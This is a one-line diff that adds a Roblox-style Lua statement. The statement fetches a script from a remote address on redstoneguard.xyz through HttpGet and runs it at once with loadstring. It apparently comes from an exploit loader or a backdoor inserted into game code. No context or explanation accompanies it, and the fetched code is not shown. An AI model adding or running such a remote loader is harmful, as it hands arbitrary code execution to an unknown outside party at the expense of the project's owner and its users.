@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://redstoneguard.xyz/api/loader/7f5ead6a-6fb8-43d7-a428-6c9619ffc412/init"))()
